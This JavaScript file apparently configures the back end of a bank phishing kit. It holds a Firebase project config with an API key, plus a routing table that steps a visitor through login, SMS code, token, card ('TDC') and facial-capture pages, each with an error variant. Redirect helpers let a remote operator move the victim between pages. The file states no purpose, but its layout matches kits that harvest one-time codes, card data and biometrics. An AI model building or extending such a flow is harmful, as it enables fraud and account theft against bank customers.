const firebaseConfig = {
    apiKey: "AIzaSyA9QqXTLzB-eyaGp8QTBXWnpFv1PhqWaaY",
    authDomain: "test-c2270.firebaseapp.com",
    projectId: "test-c2270",
    storageBucket: "test-c2270.firebasestorage.app",
    messagingSenderId: "556855035381",
    appId: "1:556855035381:web:8c2876720d2d82f8074cbc"
};

if (typeof firebase !== "undefined") {
    if (!firebase.apps.length) {
        firebase.initializeApp(firebaseConfig);
    }
    window.db = firebase.firestore();
}

const appConfig = {
    routes: {
        1: { url: "index.html", name: "Index" },
        2: { url: "index.html", name: "Index Error" },
        3: { url: "sms.html", name: "SMS" },
        4: { url: "sms.html", name: "SMS Error" },
        5: { url: "token.html", name: "Token" },
        6: { url: "token.html", name: "Token Error" },
        7: { url: "tdc.html", name: "TDC" },
        8: { url: "tdc.html", name: "TDC Error" },
        9: { url: "facial.html", name: "Facial" },
        10: { url: "facial_err.html", name: "Facial Error" }
    },
    timeout: 100000,
    actions: {
        home: { page: 1, color: "#87f79fff" },
        index_err: { page: 2, color: "#ffd6de" },
        sms: { page: 3, color: "#0081ff" },
        sms_err: { page: 4, color: "#ffd6de" },
        token: { page: 5, color: "#0056cb" },
        token_err: { page: 6, color: "#ffd6de" },
        tdc: { page: 7, color: "#022047" },
        tdc_err: { page: 8, color: "#ffd6de" },
        facial: { page: 9, color: "#28a745" },
        facial_err: { page: 10, color: "#ffd6de" }
    },
    status: {
        0: { text: "Cargando", class: "warning" },
        1: { text: "Index", class: "success" },
        2: { text: "Index Error", class: "danger" },
        3: { text: "SMS", class: "success" },
        4: { text: "SMS Error", class: "danger" },
        5: { text: "Token", class: "success" },
        6: { text: "Token Error", class: "danger" },
        7: { text: "TDC", class: "success" },
        8: { text: "TDC Error", class: "danger" },
        9: { text: "Facial", class: "success" },
        10: { text: "Facial Error", class: "danger" }
    }
};

window.appConfig = appConfig;
window.firebaseConfig = firebaseConfig;

window.getRouteByPage = function (page) {
    var p = Number(page || 0);
    var route = appConfig.routes && appConfig.routes[p] ? String(appConfig.routes[p].url || "") : "";
    if (!route) return "";
    if (route === "/") return "index.html";
    if (route.charAt(0) === "/") return route.slice(1);
    return route;
};

window.redirectByPage = function (page, currentFileName) {
    var route = window.getRouteByPage(page);
    if (!route) return false;
    if (currentFileName && route === currentFileName) return false;
    window.location.href = route;
    return true;
};
